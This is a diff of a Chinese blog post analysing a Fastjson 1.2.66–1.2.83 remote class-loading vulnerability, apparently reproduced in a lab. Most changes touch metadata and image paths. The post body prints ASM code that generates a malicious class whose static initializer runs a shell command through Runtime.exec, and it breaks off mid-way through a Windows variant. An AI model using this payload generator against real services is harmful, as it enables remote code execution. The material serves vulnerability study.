@@ -20,45 +20,45 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"hai0unu11.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-tomorrow"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="Fastjson 1.2.66 ~ 1.2.83 在 ParserConfig.checkAutoType 中存在一个 @JSONType 注解探测路径的远程类加载漏洞。 https:&#x2F;&#x2F;github.com&#x2F;midisec&#x2F;fastjson-1.2.83-gadget-rce：    属性 说明    影响版本 Fastjson 1.2.66 ~ 1.2.83   利用条件 SafeMode&amp;#">
+    <meta name="description" content="Fastjson 1.2.66 ~ 1.2.83 在 ParserConfig.checkAutoType 中存在一个 @JSONType 注解探测路径的远程类加载漏洞。  https:&#x2F;&#x2F;github.com&#x2F;midisec&#x2F;fastjson-1.2.83-gadget-rce：     属性 说明    影响版本 Fastjson 1.2.66 ~ 1.2.83   利用条件 SafeMode">
 <meta property="og:type" content="article">
 <meta property="og:title" content="FastJson 1.2.83 漏洞分析">
 <meta property="og:url" content="https://hai0unu11.github.io/2026/08/06/FastJson-1-2-83-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="Hai0uBlog">
-<meta property="og:description" content="Fastjson 1.2.66 ~ 1.2.83 在 ParserConfig.checkAutoType 中存在一个 @JSONType 注解探测路径的远程类加载漏洞。 https:&#x2F;&#x2F;github.com&#x2F;midisec&#x2F;fastjson-1.2.83-gadget-rce：    属性 说明    影响版本 Fastjson 1.2.66 ~ 1.2.83   利用条件 SafeMode&amp;#">
+<meta property="og:description" content="Fastjson 1.2.66 ~ 1.2.83 在 ParserConfig.checkAutoType 中存在一个 @JSONType 注解探测路径的远程类加载漏洞。  https:&#x2F;&#x2F;github.com&#x2F;midisec&#x2F;fastjson-1.2.83-gadget-rce：     属性 说明    影响版本 Fastjson 1.2.66 ~ 1.2.83   利用条件 SafeMode">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784790751189-4d193ea0-cd43-4840-8c55-1df5181e728a.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784821248262-dd136a05-c374-4d63-928c-afb9c7f9bd31.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784817459404-7e00e7f1-69ec-43b0-9bc1-8f85275a86e3.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784821138718-ec8dbb6b-171d-406c-b2d8-27af7797705f.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784821552836-4d256bf7-e28c-4fa0-b1a5-1f8f45e2256e.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784860222136-e97caf96-b535-4cf1-aa90-572a9a818616.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784862015747-a95d8303-1612-4118-8d5f-370c2468bfea.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784863124467-2d185d67-b38e-4610-853f-e9e5c4aec535.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784864251803-3694b9c9-149a-4b9e-ab0b-0f50bc1eaca0.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784864556758-528019ea-2939-452b-9d33-519cf02db7ad.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784864618293-54fcfe39-9859-4a34-8554-3935b72e4e93.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784864730980-1a53ea58-1f6f-421e-bf60-0d344ed8655d.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784880113496-4ac0ff41-6175-4bbe-a262-d4f8ce477440.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784880245165-dfadb9de-0bdb-4bc7-b4db-300f7fd0c30b.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784880279490-5fec09d3-311d-4d6e-af46-31d86e83d88e.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784880362920-5cd65dec-fad2-473e-91ea-8dd2dafee904.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784880397876-4b66ecba-699a-4d5f-adea-caa8c53c2fc4.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1785464267189-54a378ca-6709-4e0f-b843-3b311c45c728.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1785465105424-f3d397f7-6eff-4aa7-a799-31b9740ab2cc.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1785465826205-7f557133-ea47-42cd-a678-7064c38eacd1.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1785465797996-caeefbf3-59c0-4afe-a568-8d585f5ec657.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1785043566075-87607c03-b853-4f67-bec7-2a90bba88eaf.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1785749859161-a4c1ba19-773c-45da-9b31-486c30d716b6.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784881475235-1b8fd834-2109-4ba7-a7ed-11858a1d3556.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784881830415-04ef9aa7-c203-4f2c-ae18-a834bcb62d46.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-5.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-6.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-7.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-8.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-9.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-10.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-11.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-12.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-13.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-14.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-15.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-16.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-17.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-18.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-19.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-20.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-21.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-22.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-23.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-24.png">
+<meta property="og:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-25.png">
 <meta property="article:published_time" content="2026-08-06T09:37:16.000Z">
-<meta property="article:modified_time" content="2026-08-06T09:39:44.826Z">
+<meta property="article:modified_time" content="2026-08-07T02:13:22.466Z">
 <meta property="article:author" content="Hai0u">
 <meta property="article:tag" content="Java">
-<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="漏洞分析">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784790751189-4d193ea0-cd43-4840-8c55-1df5181e728a.png">
+<meta name="twitter:image" content="https://hai0unu11.github.io/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1.png">
 
 
 <link rel="canonical" href="https://hai0unu11.github.io/2026/08/06/FastJson-1-2-83-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
@@ -174,7 +174,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -233,9 +233,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2026-08-06 17:37:16 / 修改时间：17:39:44" itemprop="dateCreated datePublished" datetime="2026-08-06T17:37:16+08:00">2026-08-06</time>
+      <time title="创建时间：2026-08-06 17:37:16" itemprop="dateCreated datePublished" datetime="2026-08-06T17:37:16+08:00">2026-08-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-08-07 10:13:22" itemprop="dateModified" datetime="2026-08-07T10:13:22+08:00">2026-08-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -257,7 +263,9 @@
     
     
     <div class="post-body" itemprop="articleBody"><p>Fastjson 1.2.66 ~ 1.2.83 在 <code>ParserConfig.checkAutoType</code> 中存在一个 <code>@JSONType</code> 注解探测路径的远程类加载漏洞。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/midisec/fastjson-1.2.83-gadget-rce%EF%BC%9A">https://github.com/midisec/fastjson-1.2.83-gadget-rce：</a></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/midisec/fastjson-1.2.83-gadget-rce">https://github.com/midisec/fastjson-1.2.83-gadget-rce</a>：</p>
+</blockquote>
 <table>
 <thead>
 <tr>
@@ -286,79 +294,89 @@
 <td>需两阶段 <code>jar:http://</code> → <code>/proc/self/fd/N</code> fd bridge 绕过 defineClass <code>//</code> 校验</td>
 </tr>
 </tbody></table>
-<p>Spring Boot fat-jar 的 LaunchedURLClassLoader 启动阶段会通过 JarFile.registerUrlProtocolHandler() 注册自定义 jar: 协议处理，使该类加载器能够处理 jar:http:&#x2F;&#x2F;、jar:file: 形式的资源路径，而如果由 AppClassLoader 加载，AppClassLoader 根本处理不了 jar: 协议。</p>
-<h2 id="0x01-开始调试："><a href="#0x01-开始调试：" class="headerlink" title="0x01 开始调试："></a>0x01 开始调试：</h2><h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>macos系统</p>
+<blockquote>
+<p>Spring Boot fat-jar 的 LaunchedURLClassLoader 启动阶段会通过 JarFile.registerUrlProtocolHandler() 注册自定义 jar: 协议处理，使该类加载器能够处理 jar:http:&#x2F;&#x2F;、jar:file: 形式的资源路径，而如果由 AppClassLoader 加载，AppClassLoader 根本处理不了 jar: 协议。</p>
+</blockquote>
+<h2 id="0x01-开始调试："><a href="#0x01-开始调试：" class="headerlink" title="0x01 开始调试："></a>0x01 开始调试：</h2><h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><blockquote>
+<p>macos系统</p>
 <p>java 1.8</p>
-<p>靶场：<a target="_blank" rel="noopener" href="https://github.com/midisec/fastjson-1.2.83-gadget-rce%EF%BC%9A">https://github.com/midisec/fastjson-1.2.83-gadget-rce：</a></p>
+<p>靶场：<a target="_blank" rel="noopener" href="https://github.com/midisec/fastjson-1.2.83-gadget-rce">https://github.com/midisec/fastjson-1.2.83-gadget-rce</a>：</p>
+</blockquote>
 <p><strong>需要注意的是</strong>：windows和Linux、mac的恶意文件是有区别的</p>
 <p>自带的GenProbe.java只适合Linux和mac的</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (execCommand) &#123;</span><br><span class="line">            <span class="type">MethodVisitor</span> <span class="variable">clinit</span> <span class="operator">=</span> cw.visitMethod(Opcodes.ACC_STATIC, <span class="string">&quot;&lt;clinit&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            clinit.visitCode();</span><br><span class="line">            clinit.visitMethodInsn(Opcodes.INVOKESTATIC, <span class="string">&quot;java/lang/Runtime&quot;</span>, <span class="string">&quot;getRuntime&quot;</span>, <span class="string">&quot;()Ljava/lang/Runtime;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            clinit.visitInsn(Opcodes.ICONST_3);</span><br><span class="line">            clinit.visitTypeInsn(Opcodes.ANEWARRAY, <span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">            clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_0);</span><br><span class="line">            clinit.visitLdcInsn(<span class="string">&quot;/bin/bash&quot;</span>); clinit.visitInsn(Opcodes.AASTORE);</span><br><span class="line">            clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_1);</span><br><span class="line">            clinit.visitLdcInsn(<span class="string">&quot;-c&quot;</span>); clinit.visitInsn(Opcodes.AASTORE);</span><br><span class="line">            clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_2);</span><br><span class="line">            clinit.visitLdcInsn(cmd); clinit.visitInsn(Opcodes.AASTORE);</span><br><span class="line">            clinit.visitMethodInsn(Opcodes.INVOKEVIRTUAL, <span class="string">&quot;java/lang/Runtime&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;([Ljava/lang/String;)Ljava/lang/Process;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            clinit.visitInsn(Opcodes.POP);</span><br><span class="line">            clinit.visitInsn(Opcodes.RETURN);</span><br><span class="line">            clinit.visitMaxs(<span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">            clinit.visitEnd();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (execCommand) &#123;</span><br><span class="line">            <span class="type">MethodVisitor</span> <span class="variable">clinit</span> <span class="operator">=</span> cw.visitMethod(Opcodes.ACC_STATIC, <span class="string">&quot;&lt;clinit&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            clinit.visitCode();</span><br><span class="line">            clinit.visitMethodInsn(Opcodes.INVOKESTATIC, <span class="string">&quot;java/lang/Runtime&quot;</span>, <span class="string">&quot;getRuntime&quot;</span>, <span class="string">&quot;()Ljava/lang/Runtime;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            clinit.visitInsn(Opcodes.ICONST_3);</span><br><span class="line">            clinit.visitTypeInsn(Opcodes.ANEWARRAY, <span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">            clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_0);</span><br><span class="line">            clinit.visitLdcInsn(<span class="string">&quot;/bin/bash&quot;</span>); clinit.visitInsn(Opcodes.AASTORE);</span><br><span class="line">            clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_1);</span><br><span class="line">            clinit.visitLdcInsn(<span class="string">&quot;-c&quot;</span>); clinit.visitInsn(Opcodes.AASTORE);</span><br><span class="line">            clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_2);</span><br><span class="line">            clinit.visitLdcInsn(cmd); clinit.visitInsn(Opcodes.AASTORE);</span><br><span class="line">            clinit.visitMethodInsn(Opcodes.INVOKEVIRTUAL, <span class="string">&quot;java/lang/Runtime&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;([Ljava/lang/String;)Ljava/lang/Process;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            clinit.visitInsn(Opcodes.POP);</span><br><span class="line">            clinit.visitInsn(Opcodes.RETURN);</span><br><span class="line">            clinit.visitMaxs(<span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">            clinit.visitEnd();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>如果是windows环境，需要自己修改一下，因为windows没有&#x2F;bin&#x2F;bash，需要改成cmd.exe</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (execCommand) &#123;</span><br><span class="line">    <span class="type">MethodVisitor</span> <span class="variable">clinit</span> <span class="operator">=</span> cw.visitMethod(Opcodes.ACC_STATIC, <span class="string">&quot;&lt;clinit&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    clinit.visitCode();</span><br><span class="line">    clinit.visitMethodInsn(Opcodes.INVOKESTATIC, <span class="string">&quot;java/lang/Runtime&quot;</span>, <span class="string">&quot;getRuntime&quot;</span>, <span class="string">&quot;()Ljava/lang/Runtime;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    